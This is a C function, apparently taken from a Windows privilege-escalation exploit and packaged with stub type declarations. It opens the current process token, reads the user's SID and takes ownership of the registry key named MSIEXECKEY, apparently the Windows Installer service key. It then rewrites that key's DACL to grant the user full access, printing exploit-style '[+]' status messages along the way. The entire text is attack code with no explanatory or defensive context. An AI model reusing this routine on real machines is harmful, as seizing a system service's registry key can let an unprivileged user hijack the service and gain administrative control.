
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_11__ TYPE_4__ ;
typedef struct TYPE_10__ TYPE_3__ ;
typedef struct TYPE_9__ TYPE_2__ ;
typedef struct TYPE_8__ TYPE_1__ ;


struct TYPE_8__ {scalar_t__ ptstrName; int TrusteeType; int TrusteeForm; } ;
struct TYPE_11__ {TYPE_1__ Trustee; int grfInheritance; int grfAccessMode; int grfAccessPermissions; } ;
struct TYPE_9__ {int * Sid; } ;
struct TYPE_10__ {TYPE_2__ User; } ;
typedef TYPE_3__* PTOKEN_USER ;
typedef int * PACL ;
typedef scalar_t__ LPTSTR ;
typedef int HANDLE ;
typedef TYPE_4__ EXPLICIT_ACCESS ;
typedef int DWORD ;


 int CloseHandle (int ) ;
 int DACL_SECURITY_INFORMATION ;
 scalar_t__ ERROR_INSUFFICIENT_BUFFER ;
 scalar_t__ ERROR_SUCCESS ;
 int ExitProcess (int) ;
 int GRANT_ACCESS ;
 int GetCurrentProcess () ;
 int GetLastError () ;
 int GetTokenInformation (int ,int ,TYPE_3__*,int ,int *) ;
 int KEY_ALL_ACCESS ;
 scalar_t__ LocalAlloc (int ,int ) ;
 int LocalFree (int *) ;
 char* MSIEXECKEY ;
 int OWNER_SECURITY_INFORMATION ;
 int OpenProcessToken (int ,int ,int *) ;
 int SE_REGISTRY_KEY ;
 int SUB_CONTAINERS_AND_OBJECTS_INHERIT ;
 scalar_t__ SetEntriesInAcl (int,TYPE_4__*,int *,int **) ;
 scalar_t__ SetNamedSecurityInfo (char*,int ,int ,int *,int *,int *,int *) ;
 int TOKEN_ALL_ACCESS ;
 int TRUSTEE_IS_SID ;
 int TRUSTEE_IS_USER ;
 int TokenUser ;
 int ZeroMemory (TYPE_4__*,int) ;
 int printf (char*,...) ;

int TakeOwnership()
{
     HANDLE token;
     PTOKEN_USER user = ((void*)0);
     PACL pACL = ((void*)0);
     EXPLICIT_ACCESS ea;
     DWORD dwLengthNeeded;



     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &token))
     {
         printf("\n[-] OpenProcessToken failed %d\n\n", GetLastError());
         ExitProcess(1);
     }
     printf("\n[+] OpenProcessToken successful");

     if (!GetTokenInformation(token, TokenUser, ((void*)0), 0, &dwLengthNeeded) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
     {
         printf("\n[-] Failed to initialize GetTokenInformation %d\n\n", GetLastError());
         ExitProcess(1);
     }

     user = (PTOKEN_USER)LocalAlloc(0, dwLengthNeeded);

     if (!GetTokenInformation(token, TokenUser, user, dwLengthNeeded, &dwLengthNeeded))
     {
         printf("\n[-] GetTokenInformation failed %d\n\n", GetLastError());
         ExitProcess(1);
     }

     ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));



     ea.grfAccessPermissions = KEY_ALL_ACCESS;
     ea.grfAccessMode = GRANT_ACCESS;
     ea.grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
     ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
     ea.Trustee.TrusteeType = TRUSTEE_IS_USER;
     ea.Trustee.ptstrName = (LPTSTR)user->User.Sid;

     if (SetEntriesInAcl(1, &ea, ((void*)0), &pACL) != ERROR_SUCCESS)
     {
         printf("\n[-] SetEntriesInAcl failure\n\n");
         ExitProcess(1);
     }
     printf("\n[+] SetEntriesInAcl successful");



     if (SetNamedSecurityInfo(MSIEXECKEY, SE_REGISTRY_KEY, OWNER_SECURITY_INFORMATION, user->User.Sid, ((void*)0), ((void*)0), ((void*)0)) != ERROR_SUCCESS)
     {
         printf("\n[-] Failed to obtain the object's ownership %d\n\n", GetLastError());
         ExitProcess(1);
     }
     printf("\n[+] Ownership '%s' successful", MSIEXECKEY);



     if (SetNamedSecurityInfo(MSIEXECKEY, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, ((void*)0), ((void*)0), pACL, ((void*)0)) != ERROR_SUCCESS)
     {
         printf("\n[-] Failed to modify the object's DACL %d\n\n", GetLastError());
         ExitProcess(1);
     }
     printf("\n[+] Object's DACL successfully modified");

     LocalFree(pACL);
     CloseHandle(token);

     return 0;
}
